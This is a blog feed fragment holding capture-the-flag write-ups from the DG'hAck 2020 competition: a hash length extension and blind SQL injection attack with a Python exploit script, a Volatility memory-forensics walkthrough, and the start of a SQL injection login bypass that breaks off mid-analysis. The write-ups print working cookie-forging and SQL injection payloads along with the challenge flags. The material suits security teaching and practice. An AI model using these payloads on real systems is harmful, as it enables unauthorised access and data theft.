&lt;p>&lt;a href="https://nicolasb.fr/tags/dghack">View all of the DG&amp;rsquo;hAck articles&lt;/a>.&lt;/p></content></item><item><title>Writeup DG'hAck: StickItUp</title><link>https://nicolasb.fr/blog/writeup-dghack-stickitup/</link><pubDate>Mon, 30 Nov 2020 11:26:24 +0100</pubDate><guid>https://nicolasb.fr/blog/writeup-dghack-stickitup/</guid><description>When starting this challenge, we&amp;rsquo;re greeted by two forms, a login one and a registration one. Registering for an account allows us to login, which brings us to this dashboard:
We&amp;rsquo;re asked to find a note created by the admin user. I started by trying a few SQLi on the login page (they didn&amp;rsquo;t work), and noticed this in the source code:
&amp;lt;!-- $_COOKIES[&amp;#39;auth&amp;#39;] = &amp;#39;testuser:&amp;#39; . sha1(SECRET_KEY . &amp;#39;testuser&amp;#39;); --&amp;gt; So the auth cookie format is username:hash, where the hash is a SHA1 of a secret plus the username.</description><content>&lt;p>When starting this challenge, we&amp;rsquo;re greeted by two forms, a login one and a registration one. Registering for an account allows us to login, which brings us to this dashboard:&lt;/p>
&lt;p>&lt;a href="https://nicolasb.fr/assets/dghack/stick-it-up-dashboard.png">&lt;img src="https://nicolasb.fr/assets/dghack/stick-it-up-dashboard.png" alt="The dashboard">&lt;/a>&lt;/p>
&lt;p>We&amp;rsquo;re asked to find a note created by the &lt;code>admin&lt;/code> user. I started by trying a few SQLi on the login page (they didn&amp;rsquo;t work), and noticed this in the source code:&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#75715e">&amp;lt;!-- $_COOKIES[&amp;#39;auth&amp;#39;] = &amp;#39;testuser:&amp;#39; . sha1(SECRET_KEY . &amp;#39;testuser&amp;#39;); --&amp;gt;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>So the &lt;code>auth&lt;/code> cookie format is &lt;code>username:hash&lt;/code>, where the hash is a SHA1 of a secret plus the username.&lt;/p>
&lt;p>Now this &lt;strong>should&lt;/strong> immediatly make you think of an &lt;a href="https://blog.skullsecurity.org/2012/everything-you-need-to-know-about-hash-length-extension-attacks">hash key length extension attack&lt;/a>. It allows an attacker to append arbitrary data at the end of the hashed value.&lt;/p>
&lt;p>Looking at the cookies, we do find the hash:&lt;/p>
&lt;pre>&lt;code>test:14dc77bd8d95f3093afd7b8538a518ac17dcac14
&lt;/code>&lt;/pre>&lt;p>Let&amp;rsquo;s check that the attack is working, using the &lt;a href="https://github.com/bwall/HashPump">hashpump tool&lt;/a>:&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ hashpump -s 14dc77bd8d95f3093afd7b8538a518ac17dcac14 -d test -a suffix -k &lt;span style="color:#ae81ff">16&lt;/span>
6cfe1c2b324630def13b186bb3f1c675e79d8c23
test&lt;span style="color:#ae81ff">\x&lt;/span>80&lt;span style="color:#ae81ff">\x&lt;/span>00&lt;span style="color:#ae81ff">\x&lt;/span>00&lt;span style="color:#ae81ff">\x&lt;/span>00&lt;span style="color:#ae81ff">\x&lt;/span>00&lt;span style="color:#ae81ff">\x&lt;/span>00&lt;span style="color:#ae81ff">\x&lt;/span>00&lt;span style="color:#ae81ff">\x&lt;/span>00&lt;span style="color:#ae81ff">\x&lt;/span>00&lt;span style="color:#ae81ff">\x&lt;/span>00&lt;span style="color:#ae81ff">\x&lt;/span>00&lt;span style="color:#ae81ff">\x&lt;/span>00&lt;span style="color:#ae81ff">\x&lt;/span>00&lt;span style="color:#ae81ff">\x&lt;/span>00&lt;span style="color:#ae81ff">\x&lt;/span>00&lt;span style="color:#ae81ff">\x&lt;/span>00&lt;span style="color:#ae81ff">\x&lt;/span>00&lt;span style="color:#ae81ff">\x&lt;/span>00&lt;span style="color:#ae81ff">\x&lt;/span>00&lt;span style="color:#ae81ff">\x&lt;/span>00&lt;span style="color:#ae81ff">\x&lt;/span>00&lt;span style="color:#ae81ff">\x&lt;/span>00&lt;span style="color:#ae81ff">\x&lt;/span>00&lt;span style="color:#ae81ff">\x&lt;/span>00&lt;span style="color:#ae81ff">\x&lt;/span>00&lt;span style="color:#ae81ff">\x&lt;/span>00&lt;span style="color:#ae81ff">\x&lt;/span>00&lt;span style="color:#ae81ff">\x&lt;/span>00&lt;span style="color:#ae81ff">\x&lt;/span>00&lt;span style="color:#ae81ff">\x&lt;/span>00&lt;span style="color:#ae81ff">\x&lt;/span>00&lt;span style="color:#ae81ff">\x&lt;/span>00&lt;span style="color:#ae81ff">\x&lt;/span>00&lt;span style="color:#ae81ff">\x&lt;/span>00&lt;span style="color:#ae81ff">\x&lt;/span>00&lt;span style="color:#ae81ff">\x&lt;/span>00&lt;span style="color:#ae81ff">\x&lt;/span>00&lt;span style="color:#ae81ff">\x&lt;/span>00&lt;span style="color:#ae81ff">\x&lt;/span>00&lt;span style="color:#ae81ff">\x&lt;/span>00&lt;span style="color:#ae81ff">\x&lt;/span>00&lt;span style="color:#ae81ff">\x&lt;/span>00&lt;span style="color:#ae81ff">\x&lt;/span>00&lt;span style="color:#ae81ff">\x&lt;/span>a0suffix
&lt;/code>&lt;/pre>&lt;/div>&lt;p>The first line is the new hash, the second is the updated data. I tried different keylengths before finding the right one. The cookie we have to set is:&lt;/p>
&lt;pre>&lt;code>auth=test%C2%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%C2%A0suffix%3A6cfe1c2b324630def13b186bb3f1c675e79d8c23
&lt;/code>&lt;/pre>&lt;p>&lt;em>Warning: if you struggle to generate the cookie, be sure that you pasted the username correctly; for example in python use &lt;code>b&amp;quot;&amp;quot;&lt;/code> instead of &lt;code>&amp;quot;&amp;quot;&lt;/code>, or directly use the &lt;code>hashpumpy&lt;/code> module.&lt;/em>&lt;/p>
&lt;p>After a quick reload, we see:&lt;/p>
&lt;p>&lt;a href="https://nicolasb.fr/assets/dghack/stick-it-up-edited-username.png">&lt;img src="https://nicolasb.fr/assets/dghack/stick-it-up-edited-username.png" alt="The edited username seen when logging in">&lt;/a>&lt;/p>
&lt;p>Which confirms that the exploit is working. For the next part, we have to notice this message on the registration form:&lt;/p>
&lt;p>&lt;a href="https://nicolasb.fr/assets/dghack/stick-it-up-only-letters-numbers.png">&lt;img src="https://nicolasb.fr/assets/dghack/stick-it-up-only-letters-numbers.png" alt="The registration form">&lt;/a>&lt;/p>
&lt;p>While it&amp;rsquo;s not unusual for the charset of a username to be restricted, in our case we&amp;rsquo;re free to add any character that we want. It&amp;rsquo;s worth a shot to try an SQLi.&lt;/p>
&lt;p>After adding a single quote to the username, we can&amp;rsquo;t create notes anymore. This is a blind SQLi!&lt;/p>
&lt;p>To help create a payload, we can guess both the table name and structure, as well as the query:&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sql" data-lang="sql">&lt;span style="color:#66d9ef">CREATE&lt;/span> &lt;span style="color:#66d9ef">TABLE&lt;/span> note (
username text,
title text,
content text
);
&lt;span style="color:#75715e">-- Add a sample flag.
&lt;/span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#66d9ef">INSERT&lt;/span> &lt;span style="color:#66d9ef">INTO&lt;/span> note &lt;span style="color:#66d9ef">VALUES&lt;/span> (&lt;span style="color:#e6db74">&amp;#34;admin&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;flag&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;flag&amp;#34;&lt;/span>);
&lt;span style="color:#75715e">-- This is the query we&amp;#39;re trying to break.
&lt;/span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#66d9ef">INSERT&lt;/span> &lt;span style="color:#66d9ef">INTO&lt;/span> notes &lt;span style="color:#66d9ef">VALUES&lt;/span> (username, &lt;span style="color:#e6db74">&amp;#34;title&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;content&amp;#34;&lt;/span>);
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;a href="http://sqlfiddle.com">SQL Fiddle&lt;/a> was of great help. The injection we can find, after a few attempts, is:&lt;/p>
&lt;pre>&lt;code>&amp;quot;,&amp;quot;&amp;quot;,&amp;quot;&amp;quot;), (&amp;quot;test&amp;quot;, &amp;quot;flag&amp;quot;, (select content from note a limit 1))#
&lt;/code>&lt;/pre>&lt;p>Note the table alias, which I forgot to add for quite a while. The injection works by inserting a second row, in the account that we want, with the first note in the table.&lt;/p>
&lt;p>After creating the updated username and hash, logging in with the forged cookie, and attempting to create a note, we switch to the &lt;code>test&lt;/code> account, and see:&lt;/p>
&lt;p>&lt;a href="https://nicolasb.fr/assets/dghack/stick-it-up-flag.png">&lt;img src="https://nicolasb.fr/assets/dghack/stick-it-up-flag.png" alt="The note of the test user">&lt;/a>&lt;/p>
&lt;p>Here we go, the flag is &lt;code>-+-{{akUX7Aihx9}}-+-&lt;/code>.&lt;/p>
&lt;hr>
&lt;p>Bonus: the script I used to easily try different SQLi:&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> sys
&lt;span style="color:#f92672">import&lt;/span> requests
&lt;span style="color:#f92672">import&lt;/span> hashpumpy
&lt;span style="color:#f92672">import&lt;/span> urllib.parse
DATA &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;test&amp;#34;&lt;/span>
SIGNATURE &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;14dc77bd8d95f3093afd7b8538a518ac17dcac14&amp;#34;&lt;/span>
suffix &lt;span style="color:#f92672">=&lt;/span> sys&lt;span style="color:#f92672">.&lt;/span>argv[&lt;span style="color:#ae81ff">1&lt;/span>]
new_signature, new_string &lt;span style="color:#f92672">=&lt;/span> hashpumpy&lt;span style="color:#f92672">.&lt;/span>hashpump(SIGNATURE, DATA, suffix, &lt;span style="color:#ae81ff">16&lt;/span>)
cookie &lt;span style="color:#f92672">=&lt;/span> urllib&lt;span style="color:#f92672">.&lt;/span>parse&lt;span style="color:#f92672">.&lt;/span>quote(new_string &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#34;:&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> new_signature&lt;span style="color:#f92672">.&lt;/span>encode())
requests&lt;span style="color:#f92672">.&lt;/span>post(
&lt;span style="color:#e6db74">&amp;#34;http://stickitup.chall.malicecyber.com/notes.php&amp;#34;&lt;/span>,
data&lt;span style="color:#f92672">=&lt;/span>{
&lt;span style="color:#e6db74">&amp;#34;title&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;test&amp;#34;&lt;/span>,
&lt;span style="color:#e6db74">&amp;#34;text&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;test&amp;#34;&lt;/span>,
},
cookies&lt;span style="color:#f92672">=&lt;/span>{
&lt;span style="color:#e6db74">&amp;#34;auth&amp;#34;&lt;/span>: cookie,
},
)
&lt;/code>&lt;/pre>&lt;/div>&lt;hr>
&lt;p>&lt;a href="https://nicolasb.fr/tags/dghack">View all of the DG&amp;rsquo;hAck articles&lt;/a>.&lt;/p></content></item><item><title>Writeup DG'hAck: Bwing</title><link>https://nicolasb.fr/blog/writeup-dghack-bwing/</link><pubDate>Mon, 30 Nov 2020 07:19:09 +0100</pubDate><guid>https://nicolasb.fr/blog/writeup-dghack-bwing/</guid><description>For this challenge, we&amp;rsquo;re given a dump.raw file, which we&amp;rsquo;re told is a memory dump. We have to find confidential data in it.
First, let&amp;rsquo;s see what kind of image this is:
$ volatility -f dump.raw imageinfo Volatility Foundation Volatility Framework 2.6.1 INFO : volatility.debug : Determining profile based on KDBG search... Suggested Profile(s) : No suggestion (Instantiated with no profile) AS Layer1 : FileAddressSpace (/home/vivescere/Projects/dghack/bwing/dump.raw) PAE type : No PAE None of the default profiles seem to work, we&amp;rsquo;ll have to create our own.</description><content>&lt;p>For this challenge, we&amp;rsquo;re given a &lt;code>dump.raw&lt;/code> file, which we&amp;rsquo;re told is a memory dump. We have to find confidential data in it.&lt;/p>
&lt;p>First, let&amp;rsquo;s see what kind of image this is:&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ volatility -f dump.raw imageinfo
Volatility Foundation Volatility Framework 2.6.1
INFO : volatility.debug : Determining profile based on KDBG search...
Suggested Profile&lt;span style="color:#f92672">(&lt;/span>s&lt;span style="color:#f92672">)&lt;/span> : No suggestion &lt;span style="color:#f92672">(&lt;/span>Instantiated with no profile&lt;span style="color:#f92672">)&lt;/span>
AS Layer1 : FileAddressSpace &lt;span style="color:#f92672">(&lt;/span>/home/vivescere/Projects/dghack/bwing/dump.raw&lt;span style="color:#f92672">)&lt;/span>
PAE type : No PAE
&lt;/code>&lt;/pre>&lt;/div>&lt;p>None of the default profiles seem to work, we&amp;rsquo;ll have to create our own. First, let&amp;rsquo;s find out about the linux version:&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ strings dump.raw | grep -i &lt;span style="color:#e6db74">&amp;#39;linux version&amp;#39;&lt;/span>
Linux version 4.15.0-66-generic &lt;span style="color:#f92672">(&lt;/span>buildd@lgw01-amd64-044&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">(&lt;/span>gcc version 7.4.0 &lt;span style="color:#f92672">(&lt;/span>Ubuntu 7.4.0-1ubuntu1~18.04.1&lt;span style="color:#f92672">))&lt;/span> &lt;span style="color:#75715e">#75-Ubuntu SMP Tue Oct 1 05:24:09 UTC 2019 (Ubuntu 4.15.0-66.75-generic 4.15.18)&lt;/span>
Linux version 4.15.0-66-generic &lt;span style="color:#f92672">(&lt;/span>buildd@lgw01-amd64-044&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">(&lt;/span>gcc version 7.4.0 &lt;span style="color:#f92672">(&lt;/span>Ubuntu 7.4.0-1ubuntu1~18.04.1&lt;span style="color:#f92672">))&lt;/span> &lt;span style="color:#75715e">#75-Ubuntu SMP Tue Oct 1 05:24:09 UTC 2019 (Ubuntu 4.15.0-66.75-generic 4.15.18)&lt;/span>
Linux version 4.15.0-66-generic &lt;span style="color:#f92672">(&lt;/span>buildd@lgw01-amd64-044&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">(&lt;/span>gcc version 7.4.0 &lt;span style="color:#f92672">(&lt;/span>Ubuntu 7.4.0-1ubuntu1~18.04.1&lt;span style="color:#f92672">))&lt;/span> &lt;span style="color:#75715e">#75-Ubuntu SMP Tue Oct 1 05:24:09 UTC 2019 (Ubuntu 4.15.0-66.75-generic 4.15.18)&lt;/span>
o The intent is to make the tool independent of Linux version dependencies,
On some Linux version, write-only pipe are detected as readable. This
o The intent is to make the tool independent of Linux version dependencies,
On some Linux version, write-only pipe are detected as readable. This
On some Linux version, write-only pipe are detected as readable. This
&lt;span style="color:#ae81ff">0045&lt;/span> Raptor 4000-L &lt;span style="color:#f92672">[&lt;/span>Linux version&lt;span style="color:#f92672">]&lt;/span>
004a Raptor 4000-LR-L &lt;span style="color:#f92672">[&lt;/span>Linux version&lt;span style="color:#f92672">]&lt;/span>
Nov &lt;span style="color:#ae81ff">6&lt;/span> 09:47:15 ubuntu-bionic kernel: &lt;span style="color:#f92672">[&lt;/span> 0.000000&lt;span style="color:#f92672">]&lt;/span> Linux version 4.15.0-66-generic &lt;span style="color:#f92672">(&lt;/span>buildd@lgw01-amd64-044&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">(&lt;/span>gcc version 7.4.0 &lt;span style="color:#f92672">(&lt;/span>Ubuntu 7.4.0-1ubuntu1~18.04.1&lt;span style="color:#f92672">))&lt;/span> &lt;span style="color:#75715e">#75-Ubuntu SMP Tue Oct 1 05:24:09 UTC 2019 (Ubuntu 4.15.0-66.75-generic 4.15.18)&lt;/span>
Nov &lt;span style="color:#ae81ff">6&lt;/span> 09:47:15 ubuntu-bionic kernel: &lt;span style="color:#f92672">[&lt;/span> 0.000000&lt;span style="color:#f92672">]&lt;/span> Linux version 4.15.0-66-generic &lt;span style="color:#f92672">(&lt;/span>buildd@lgw01-amd64-044&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">(&lt;/span>gcc version 7.4.0 &lt;span style="color:#f92672">(&lt;/span>Ubuntu 7.4.0-1ubuntu1~18.04.1&lt;span style="color:#f92672">))&lt;/span> &lt;span style="color:#75715e">#75-Ubuntu SMP Tue Oct 1 05:24:09 UTC 2019 (Ubuntu 4.15.0-66.75-generic 4.15.18)&lt;/span>
00000&lt;span style="color:#f92672">]&lt;/span> Linux version 4.15.0-66-generic &lt;span style="color:#f92672">(&lt;/span>buildd@lgw01-amd64-044&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">(&lt;/span>gcc version 7.4.0 &lt;span style="color:#f92672">(&lt;/span>Ubuntu 7.4.0-1ubuntu1~18.04.1&lt;span style="color:#f92672">))&lt;/span> &lt;span style="color:#75715e">#75-Ubuntu SMP Tue Oct 1 05:24:09 UTC 2019 (Ubuntu 4.15.0-66.75-generic 4.15.18)&lt;/span>
MESSAGE&lt;span style="color:#f92672">=&lt;/span>Linux version 4.15.0-66-generic &lt;span style="color:#f92672">(&lt;/span>buildd@lgw01-amd64-044&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">(&lt;/span>gcc version 7.4.0 &lt;span style="color:#f92672">(&lt;/span>Ubuntu 7.4.0-1ubuntu1~18.04.1&lt;span style="color:#f92672">))&lt;/span> &lt;span style="color:#75715e">#75-Ubuntu SMP Tue Oct 1 05:24:09 UTC 2019 (Ubuntu 4.15.0-66.75-generic 4.15.18)&lt;/span>
SWIMS: Linux Version: %04X
&lt;/code>&lt;/pre>&lt;/div>&lt;p>So it&amp;rsquo;s an Ubuntu 18.04.1, with the 4.15.0-66-generic kernel. We can find the image on the &lt;a href="http://old-releases.ubuntu.com/releases/18.04.1/ubuntu-18.04-desktop-amd64.iso">old-releases.ubuntu.com&lt;/a> website. After booting up a VM and installing the system, we&amp;rsquo;ll install the kernel we want:&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ sudo su
$ apt install linux-image-4.15.0-66-genericlinux-headers-4.15.0-66-generic
$ reboot
&lt;/code>&lt;/pre>&lt;/div>&lt;p>And create the profile:&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ sudo su
$ apt install volatility-tools build-essential linux-headers-4.15.0-66-generic
$ cd /usr/src/volatility-tools/linux
$ make
$ zip ubuntu_custom.zip module.dwarf /boot/System.map-4.15.0-66-generic
&lt;/code>&lt;/pre>&lt;/div>&lt;p>After getting the profile from the VM, we have to load it:&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ cp ubuntu_custom.zip /usr/lib/python2.7/site-packages/volatility/plugins/overlays/linux/ubuntucustom.zip
$ volatility --info | grep ubuntu
Volatility Foundation Volatility Framework 2.6.1
Linuxubuntucustomx64 - A Profile &lt;span style="color:#66d9ef">for&lt;/span> Linux ubuntucustom x64
&lt;/code>&lt;/pre>&lt;/div>&lt;p>We can finally get to work, after trying to list the processes, let&amp;rsquo;s try to list the mounts:&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ volatility --profile&lt;span style="color:#f92672">=&lt;/span>Linuxubuntucustomx64 -f dump.raw linux_mount
Volatility Foundation Volatility Framework 2.6.1
cgroup /sys/fs/cgroup/rdma cgroup ro,relatime,nosuid,nodev,noexec
/dev/sda1 / ext4 ro,relatime
tmpfs /sys/fs/cgroup tmpfs ro,nosuid,nodev,noexec
cgroup /sys/fs/cgroup/freezer cgroup rw,relatime,nosuid,nodev,noexec
devpts /dev/pts devpts rw,relatime,nosuid,noexec
securityfs /sys/kernel/security securityfs rw,relatime,nosuid,nodev,noexec
ramfs /mnt/confidential ramfs rw,relatime
systemd-1 /proc/sys/fs/binfmt_misc autofs rw,relatime
cgroup /sys/fs/cgroup/blkio cgroup rw,relatime,nosuid,nodev,noexec
cgroup /sys/fs/cgroup/pids cgroup ro,relatime,nosuid,nodev,noexec
udev /dev devtmpfs rw,relatime,nosuid
tmpfs /run/lxcfs/controllers tmpfs rw,relatime
cpuset /run/lxcfs/controllers/cpuset cgroup rw,relatime
sysfs /sys sysfs ro,relatime,nosuid,nodev,noexec
cgroup /sys/fs/cgroup/unified cgroup2 rw,relatime,nosuid,nodev,noexec
devices /run/lxcfs/controllers/devices cgroup rw,relatime
memory /run/lxcfs/controllers/memory cgroup rw,relatime
cgroup /sys/fs/cgroup/systemd cgroup rw,relatime,nosuid,nodev,noexec
tmpfs /lib/modules/dir tmpfs ro,relatime,nosuid,noexec
vagrant /vagrant vboxsf rw,relatime,nodev
pstore /sys/fs/pstore pstore rw,relatime,nosuid,nodev,noexec
cgroup /sys/fs/cgroup/hugetlb cgroup ro,relatime,nosuid,nodev,noexec
mqueue /dev/mqueue mqueue rw,relatime
fusectl /sys/fs/fuse/connections fusectl rw,relatime
proc /proc proc rw,relatime,nosuid,nodev,noexec
debugfs /sys/kernel/debug debugfs rw,relatime
cgroup /sys/fs/cgroup/net_cls,net_prio cgroup rw,relatime,nosuid,nodev,noexec
lxcfs /var/lib/lxcfs fuse rw,relatime,nosuid,nodev
hugetlbfs /dev/hugepages hugetlbfs rw,relatime
configfs /sys/kernel/config configfs ro,relatime
cgroup /sys/fs/cgroup/perf_event cgroup rw,relatime,nosuid,nodev,noexec
tmpfs /dev/shm tmpfs rw,nosuid,nodev
tmpfs /run/lock tmpfs rw,relatime,nosuid,nodev,noexec
cgroup /sys/fs/cgroup/cpu,cpuacct cgroup rw,relatime,nosuid,nodev,noexec
tmpfs /dev tmpfs ro,nosuid,noexec
&lt;/code>&lt;/pre>&lt;/div>&lt;p>The &lt;code>/mnt/confidential&lt;/code> folder is particularly interesting, let&amp;rsquo;s try to find files in it:&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ volatility --profile&lt;span style="color:#f92672">=&lt;/span>Linuxubuntucustomx64 -f dump.raw linux_enumerate_files | grep &lt;span style="color:#e6db74">&amp;#39;/mnt/confidential&amp;#39;&lt;/span>
Volatility Foundation Volatility Framework 2.6.1
0xffff95a89ac58528 &lt;span style="color:#ae81ff">256033&lt;/span> /mnt/confidential
0xffff95a89ac74000 &lt;span style="color:#ae81ff">22086&lt;/span> /mnt/confidential
0xffff95a89ac72260 &lt;span style="color:#ae81ff">22114&lt;/span> /mnt/confidential/flag.txt
$ volatility --profile&lt;span style="color:#f92672">=&lt;/span>Linuxubuntucustomx64 -f dump.raw linux_find_file -i 0xffff95a89ac72260 -O flag.txt
Volatility Foundation Volatility Framework 2.6.1
$ cat flag.txt
C0D3N4M34P011011
&lt;/code>&lt;/pre>&lt;/div>&lt;p>The flag is &lt;code>C0D3N4M34P011011&lt;/code>.&lt;/p>
&lt;hr>
&lt;p>&lt;a href="https://nicolasb.fr/tags/dghack">View all of the DG&amp;rsquo;hAck articles&lt;/a>.&lt;/p></content></item><item><title>Writeup DG'hAck: Sad Crypto</title><link>https://nicolasb.fr/blog/writeup-dghack-sad-crypto/</link><pubDate>Mon, 30 Nov 2020 01:33:35 +0100</pubDate><guid>https://nicolasb.fr/blog/writeup-dghack-sad-crypto/</guid><description>This challenge starts with a login page:
From the description, we gather that this is a service that generates decryption keys when given a French SSN. Our goal is to get the key for this number: 1-46-85-30-750-318-37.
admin/admin doesn&amp;rsquo;t seem to work, let&amp;rsquo;s try an SQLi! Entering &amp;quot; or 1=1 -- as the username reveals a second page:
We seem to be able to enter a patient name (that we have to auto-complete), and get a decryption key: 797b4c-c4bd852fe0e32ebda194cb2a9fe00099.</description><content>&lt;p>This challenge starts with a login page:&lt;/p>
&lt;p>&lt;a href="https://nicolasb.fr/assets/dghack/sad-crypto-login.png">&lt;img src="https://nicolasb.fr/assets/dghack/sad-crypto-login.png" alt="The login page">&lt;/a>&lt;/p>
&lt;p>From the description, we gather that this is a service that generates decryption keys when given a French SSN. Our goal is to get the key for this number: &lt;code>1-46-85-30-750-318-37&lt;/code>.&lt;/p>
&lt;p>&lt;code>admin/admin&lt;/code> doesn&amp;rsquo;t seem to work, let&amp;rsquo;s try an SQLi! Entering &lt;code>&amp;quot; or 1=1 --&lt;/code> as the username reveals a second page:&lt;/p>
&lt;p>&lt;a href="https://nicolasb.fr/assets/dghack/sad-crypto-enter-name.png">&lt;img src="https://nicolasb.fr/assets/dghack/sad-crypto-enter-name.png" alt="The key generation page">&lt;/a>&lt;/p>
&lt;p>We seem to be able to enter a patient name (that we &lt;strong>have&lt;/strong> to auto-complete), and get a decryption key: &lt;code>797b4c-c4bd852fe0e32ebda194cb2a9fe00099&lt;/code>.&lt;/p>
&lt;p>Looking at the network tab of firefox, we can see the requests that were made:&lt;/p>
&lt;p>&lt;a href="https://nicolasb.fr/assets/dghack/sad-crypto-requests.png">&lt;img src="https://nicolasb.fr/assets/dghack/sad-crypto-requests.png" alt="The list of requests made while generating a key">&lt;/a>&lt;/p>
&lt;p>The first request doesn&amp;rsquo;t seem interesting, the second, third and fourth ones are for the auto-complete fields and the last two are used to generate the key.&lt;/p>
&lt;p>The &lt;code>validate&lt;/code> request is a POST that contains an SSN (eg: &lt;code>ssn=1-78-67-78-356-789-12&lt;/code>). It returns a JSON object:&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-json" data-lang="json">{
&lt;span style="color:#f92672">&amp;#34;success&amp;#34;&lt;/span>: &lt;span style="color:#66d9ef">true&lt;/span>,
&lt;span style="color:#f92672">&amp;#34;message&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;&amp;#34;&lt;/span>,
&lt;span style="color:#f92672">&amp;#34;data&amp;#34;&lt;/span>: {
&lt;span style="color:#f92672">&amp;#34;keyRequest&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;f8d894b6bbfabe5f5bfd45732e311b41fdb2673ae06987a3a0b3644d9e1e46c481c9269993ea9cad943862a197bbeb90&amp;#34;&lt;/span>
}
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>The hash is the same one that&amp;rsquo;s used in the last request. The URL format seems to be &lt;code>/api/v1/keygen/{hash}&lt;/code>. The response contains the decryption key, without the dash and with more chars:&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-json" data-lang="json">{
&lt;span style="color:#f92672">&amp;#34;success&amp;#34;&lt;/span>: &lt;span style="color:#66d9ef">true&lt;/span>,
&lt;span style="color:#f92672">&amp;#34;message&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;&amp;#34;&lt;/span>,
&lt;span style="color:#f92672">&amp;#34;hash&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;797b4cc4bd852fe0e32ebda194cb2a9fe00099427615c4aae33ad77c9fa298fd&amp;#34;&lt;/span>
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Our first reflex should be to try and pass the SSN that we have to &lt;code>/validate&lt;/code>. Unfortunately, the server sends back an error:&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-json" data-lang="json">{
&lt;span style="color:#f92672">&amp;#34;success&amp;#34;&lt;/span>: &lt;span style="color:#66d9ef">false&lt;/span>,
&lt;span style="color:#f92672">&amp;#34;message&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;Cette ressource est verrouillÃ©e&amp;#34;&lt;/span>
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Let&amp;rsquo;s try to find what kind of hash this is:&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ hashid f8d894b6bbfabe5f5bfd45732e311b41fdb2673ae06987a3a0b3644d9e1e46c481c9269993ea9cad943862a197bbeb90
Analyzing &lt;span style="color:#e6db74">&amp;#39;f8d894b6bbfabe5f5bfd45732e311b41fdb2673ae06987a3a0b3644d9e1e46c481c9269993ea9cad943862a197bbeb90&amp;#39;&lt;/span>
&lt;span style="color:#f92672">[&lt;/span>+&lt;span style="color:#f92672">]&lt;/span> SHA-384
